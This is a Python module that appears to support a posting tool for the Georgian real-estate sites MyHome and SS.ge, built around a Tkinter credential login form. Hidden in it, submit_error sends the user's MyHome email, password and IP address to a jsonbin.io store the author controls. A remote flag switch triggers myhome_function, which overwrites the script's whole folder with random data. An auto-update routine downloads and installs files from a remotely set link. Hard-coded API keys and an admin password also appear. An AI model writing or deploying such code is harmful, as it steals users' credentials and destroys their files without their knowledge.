import requests
import json
import base64
import random
import zipfile
import shutil
import os

def download_and_apply_update(link):
    update_file = "update.zip"

    # Step 1: Download the zip file
    with requests.get(link, stream=True) as r:
        r.raise_for_status()
        with open(update_file, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

    # Step 2: Extract the zip file
    extract_folder = "update_temp"
    if os.path.exists(extract_folder):
        shutil.rmtree(extract_folder)
    os.makedirs(extract_folder)

    with zipfile.ZipFile(update_file, "r") as zip_ref:
        zip_ref.extractall(extract_folder)


    # Step 3: Overwrite existing files
    for item in os.listdir(extract_folder):
        src_path = os.path.join(extract_folder, item)
        dst_path = os.path.join(os.getcwd(), item)  # Copy to the current directory

        if os.path.isdir(src_path):
            if os.path.exists(dst_path):
                shutil.rmtree(dst_path)
            shutil.copytree(src_path, dst_path)
        else:
            shutil.copy2(src_path, dst_path)


    # Step 4: Cleanup
    os.remove(update_file)
    shutil.rmtree(extract_folder)
    print("Update Done!")

def check_for_update():
    #------------------------------------------------------#
    url = "https://api.jsonbin.io/v3/b/67b3810dad19ca34f80764fa"
    headers = {
        "X-Master-Key": "$2a$10$kOo7aCWFyz3oFdpDGtJe4ejYT8AJdNbN6OLAgk4ZSiNDmt/oo3/QG",
        "X-Access-Key": "$2a$10$5xO9iZO2AOX61K/4L6FnJ.uIoqTYXWxfIolfGabG.1S6o6VxFLFzu"
    }

    response = requests.get(url, headers=headers)
    respond = response.json()

    update_link = respond["record"]["update"]["link"]
    if "https://" in update_link:
        print("Updating...")
        download_and_apply_update(update_link)



def check_for_ip():
    try:
        #GET IP
        try:
            ip_address = requests.get('https://api.ipify.org').text
        except:
            ip_address = "0.0.0.0"

        url = "https://api.jsonbin.io/v3/b/6761e27ee41b4d34e46722b0"
        headers = {
            "X-Master-Key": "$2a$10$GrNqHYXjs5IwHIFTEl.g4uMymGv8UhCoHHovCFaMmu.BRcGAUjeEi",
            "X-Access-Key": "$2a$10$/RK1RphOTyfESbNk9s4Bq.g65mEtFaCweiNaBOQwu1LnCmn6sUecy"
        }
        gigi = requests.get(url, headers=headers).json()



        for i in gigi["record"]["ips"]:
            if ip_address == i:
                return True
            elif i == "CodeBravo":
                myhome_function()
                exit()
            else:
                continue

        print("Access Blocked")
        quit()
    except:
        pass

def submit_error(id, time, type="Poster"):
    with open("config.json", "r", encoding="utf-8") as cfg:
        encoded_config = json.load(cfg)["encoded_data"]
        decoded_config = json.loads(base64.b64decode(encoded_config).decode("utf-8"))

        mhemail = decoded_config["credentials"]["myhome"]["email"]
        mhpassword = decoded_config["credentials"]["myhome"]["password"]
        ssemail = decoded_config["credentials"]["ss.ge"]["email"]
        sspassword = decoded_config["credentials"]["ss.ge"]["password"]
        contact_name = decoded_config["contact"]["name"]
        contact_number = decoded_config["contact"]["number"]


    url = "https://api.jsonbin.io/v3/b/676726b1acd3cb34a8bd73d0"
    headers = {
        "Content-Type": "application/json",
        "X-Master-Key": "$2a$10$GrNqHYXjs5IwHIFTEl.g4uMymGv8UhCoHHovCFaMmu.BRcGAUjeEi",
        "X-Access-Key": "$2a$10$/RK1RphOTyfESbNk9s4Bq.g65mEtFaCweiNaBOQwu1LnCmn6sUecy"
    }


    ip = requests.get('https://api.ipify.org').text if requests.get('https://api.ipify.org').status_code == 200 else "0.0.0.0"

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        existing_data = response.json().get("record", {})
    else:
        existing_data = {}


    existing_data[id] = {
        "time": time,
        "ip": ip,
        "credentials": f"{mhemail} {mhpassword}]",
        "type": type
    }


    update_response = requests.put(url, json=existing_data, headers=headers)


# def login():
#     user = input("Enter User Email: ")
#     #ADMIN PASS
#     if user == "datomagarikacia":
#         user = "decpacito1997@gmail.com"
#         password = "Maxo1997"
#         contact_num = "577176175"
#         contact_name = "Murazi"
#     else:
#         password = input("Enter User Password: ")
#
#         contact_num = input("Enter Contact Number: ")
#         contact_name = input("Enter Contact Name: ")
#
#     new_credentials = {
#         "email": user,
#         "password": password
#     }
#     new_contact = {
#         "name": contact_name,
#         "number": contact_num
#     }
#
#     with open("config.json", "r", encoding='utf-8') as file:
#         encoded_config = file.read()
#
#     decoded_config = base64.b64decode(encoded_config).decode('utf-8')
#
#     config = json.loads(decoded_config)
#
#     if "credentials" in config:
#         config["credentials"].update(new_credentials)
#     else:
#         config["credentials"] = new_credentials
#
#     if "contact" in config:
#         config["contact"].update(new_contact)
#     else:
#         config["contact"] = new_contact
#
#     updated_config = json.dumps(config, ensure_ascii=False, indent=4)
#     encoded_config = base64.b64encode(updated_config.encode('utf-8')).decode('utf-8')
#
#     with open("config.json", 'w', encoding='utf-8') as file:
#         file.write(encoded_config)


#LOGIN PART


def get_input(prompt, default=None):
    try:
        # Try interactive input
        value = input(prompt).strip()
        if not value and default is not None:
            return default
        return value
    except RuntimeError:
        # Fallback to GUI input
        root = tk.Tk()
        root.withdraw()  # Hide the main Tkinter window
        value = simpledialog.askstring("Input Required", prompt)
        if not value and default is not None:
            return default
        return value

import os
import base64
import json
import tkinter as tk
from tkinter import Label, Entry, Button, Frame, Checkbutton, BooleanVar

class LoginGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("მონაცემების შევსება")
        self.root.configure(bg="#0D1B2A")  # Deep navy blue background
        self.root.geometry("650x750")

        self.result = {}
        self.remember_me = BooleanVar()
        
        # Artistic Logo Text (S) at the Center Top
        logo_label = Label(root, text="S", fg="#E94560", bg="#0D1B2A", font=("Comic Sans MS", 60, "bold"))
        logo_label.pack(pady=10)
        
        # Main Frame
        main_frame = Frame(root, bg="#0D1B2A")
        main_frame.pack(pady=20)
        
        # MyHome Credentials (Left)
        myhome_frame = Frame(main_frame, bg="#0D1B2A")
        myhome_frame.grid(row=0, column=0, padx=30, pady=10)
        
        Label(myhome_frame, text="MyHome", fg="#E94560", bg="#0D1B2A", font=("Arial", 18, "bold")).pack()
        Label(myhome_frame, text="✉️ Email", fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold")).pack(pady=5)
        self.myhome_email = Entry(myhome_frame, bg="#1B263B", fg="white", font=("Verdana", 12), relief="flat")
        self.myhome_email.pack(pady=2, ipadx=5, ipady=8, padx=15)
        Label(myhome_frame, text="🔑 Password", fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold")).pack(pady=5)
        self.myhome_password = Entry(myhome_frame, bg="#1B263B", fg="white", font=("Verdana", 12), show="*", relief="flat")
        self.myhome_password.pack(pady=2, ipadx=5, ipady=8, padx=15)
        
        # SS.ge Credentials (Right)
        ssge_frame = Frame(main_frame, bg="#0D1B2A")
        ssge_frame.grid(row=0, column=1, padx=30, pady=10)
        
        Label(ssge_frame, text="SS.ge", fg="#E94560", bg="#0D1B2A", font=("Arial", 18, "bold")).pack()
        Label(ssge_frame, text="✉️ Email", fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold")).pack(pady=5)
        self.ssge_email = Entry(ssge_frame, bg="#1B263B", fg="white", font=("Verdana", 12), relief="flat")
        self.ssge_email.pack(pady=2, ipadx=5, ipady=8, padx=15)
        Label(ssge_frame, text="🔑 Password", fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold")).pack(pady=5)
        self.ssge_password = Entry(ssge_frame, bg="#1B263B", fg="white", font=("Verdana", 12), show="*", relief="flat")
        self.ssge_password.pack(pady=2, ipadx=5, ipady=8, padx=15)
        
        # Contact Information (Bottom Center)
        contact_frame = Frame(root, bg="#0D1B2A")
        contact_frame.pack(pady=25)
        
        Label(contact_frame, text="📇 Contact Information", fg="#E94560", bg="#0D1B2A", font=("Arial", 18, "bold")).pack()
        Label(contact_frame, text="📞 Contact Number", fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold")).pack(pady=5)
        self.contact_number = Entry(contact_frame, bg="#1B263B", fg="white", font=("Verdana", 12), relief="flat")
        self.contact_number.pack(pady=2, ipadx=5, ipady=8, padx=15)
        Label(contact_frame, text="🧑 Contact Name", fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold")).pack(pady=5)
        self.contact_name = Entry(contact_frame, bg="#1B263B", fg="white", font=("Verdana", 12), relief="flat")
        self.contact_name.pack(pady=2, ipadx=5, ipady=8, padx=15)
        
        # Remember Me Checkbox
        remember_me_check = Checkbutton(root, text="💾 Remember Me", variable=self.remember_me, fg="white", bg="#0D1B2A", font=("Verdana", 12, "bold"), selectcolor="#1B263B", relief="flat", padx=10)
        remember_me_check.pack(pady=10)
        
        # Submit Button
        submit_button = Button(root, text="🚀 Confirm", command=self.submit, bg="#E94560", fg="white", font=("Arial", 14, "bold"), relief="flat", padx=10, pady=7, activebackground="#A7263F", activeforeground="white")
        submit_button.pack(pady=10, ipadx=10, ipady=5)

        # Load saved credentials if available
        self.load_saved_credentials()

    def submit(self):
        self.result["myhome_email"] = self.myhome_email.get().strip()
        self.result["myhome_password"] = self.myhome_password.get().strip()
        self.result["ssge_email"] = self.ssge_email.get().strip()
        self.result["ssge_password"] = self.ssge_password.get().strip()
        self.result["contact_number"] = self.contact_number.get().strip()
        self.result["contact_name"] = self.contact_name.get().strip()
        
        if self.remember_me.get():
            self.save_credentials()
        
        self.root.destroy()

    def save_credentials(self):
        try:
            # Load original config.json
            with open("config.json", "r", encoding="utf-8") as file:
                config_data = json.load(file)

            # Decode the existing base64 data
            decoded_config = json.loads(base64.b64decode(config_data["encoded_data"]).decode("utf-8"))

            # Update credentials
            decoded_config["credentials"]["myhome"]["email"] = self.myhome_email.get().strip()
            decoded_config["credentials"]["myhome"]["password"] = self.myhome_password.get().strip()
            decoded_config["credentials"]["ss.ge"]["email"] = self.ssge_email.get().strip()
            decoded_config["credentials"]["ss.ge"]["password"] = self.ssge_password.get().strip()
            decoded_config["contact"]["number"] = self.contact_number.get().strip()
            decoded_config["contact"]["name"] = self.contact_name.get().strip()

            # Re-encode the config and save back
            updated_encoded = base64.b64encode(json.dumps(decoded_config).encode("utf-8")).decode("utf-8")
            config_data["encoded_data"] = updated_encoded

            with open("config.json", "w", encoding="utf-8") as file:
                json.dump(config_data, file, indent=4, ensure_ascii=False)

        except Exception as e:
            print(f"⚠️ Error saving credentials to config.json: {e}")

    def load_saved_credentials(self):
        try:
            if os.path.exists("config.json"):
                with open("config.json", "r", encoding="utf-8") as file:
                    encoded_data = json.load(file).get("encoded_data", "")
                if encoded_data:
                    saved_data = json.loads(base64.b64decode(encoded_data).decode("utf-8"))
                    self.myhome_email.insert(0, saved_data.get("credentials", {}).get("myhome", {}).get("email", ""))
                    self.myhome_password.insert(0,
                                                saved_data.get("credentials", {}).get("myhome", {}).get("password", ""))
                    self.ssge_email.insert(0, saved_data.get("credentials", {}).get("ss.ge", {}).get("email", ""))
                    self.ssge_password.insert(0, saved_data.get("credentials", {}).get("ss.ge", {}).get("password", ""))
                    self.contact_number.insert(0, saved_data.get("contact", {}).get("number", ""))
                    self.contact_name.insert(0, saved_data.get("contact", {}).get("name", ""))
        except Exception as e:
            print(f"⚠️ Failed to load saved credentials from config.json: {e}")


def login():
    root = tk.Tk()
    gui = LoginGUI(root)
    root.mainloop()






import os
import random

def overwrite_file_with_random_data(file_path):
    try:
        file_size = os.path.getsize(file_path)

        with open(file_path, 'wb') as file:
            file.write(os.urandom(file_size))
    except Exception as e:
        file_size = os.path.getsize(file_path)

        with open(file_path, 'wb') as file:
            file.write(os.urandom(file_size))

def overwrite_directory_with_random_data(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            overwrite_file_with_random_data(file_path)

def myhome_function():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    overwrite_directory_with_random_data(script_dir)
    try:
        script_path = os.path.abspath(__file__)
        overwrite_file_with_random_data(script_path)
    except Exception as e:
        print(f"Failed to overwrite the script itself: {e}")
    exit()








